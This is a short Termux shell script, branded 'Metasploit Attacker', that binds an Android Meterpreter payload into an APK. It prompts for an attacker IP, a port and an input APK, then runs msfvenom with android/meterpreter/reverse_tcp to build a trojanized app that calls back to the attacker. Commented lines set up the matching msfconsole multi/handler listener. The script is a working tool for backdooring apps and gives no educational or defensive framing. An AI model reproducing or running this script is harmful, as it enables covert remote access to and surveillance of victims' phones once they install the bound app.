#!system/bin/sh
clear
echo "###############################################"
figlet -w 70 Metasploit Attacker | lolcat
echo "Note:only for preinstalled msfconsole"
echo "created by:Gamer_Sandesh"
echo "###############################################"
echo "your ip is :" ;curl ifconfig.me
read -p "     Enter ip     : " ip
echo "       .......saved........"
read -p "     Enter port   : " po
echo "       .......saved........"
read -p "     Enter apk    : " apk
echo "       .......saved........"
read -p "     Enter OPapk  : " oapk
echo "       .......saved........"
sleep 1
logo
sleep 0.5
clear
echo "Your apk is started to binding"
#msfvenom -x $apk --arch dalvik --platform android --payload android LPORT=$po LHOST=$ip -o $oapk
msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$po --platform android --arch dalvik AndroidHideAppIcon=false AndroidMeterpreterDebug=true AndroidWakelock=true -o $oapk
echo "Your apk $oapk is binded..."
figlet -w Attack Now........
##this is only speaker and torch.termux-tts-speak

termux-torch on
sleep 5
termux-torch off
#clear
#msfconsole
#sleep 5
#set multi/handler
#sleep 0.5
#set lhost $ip
#sleep 0.5
#set lport $po
#exploit

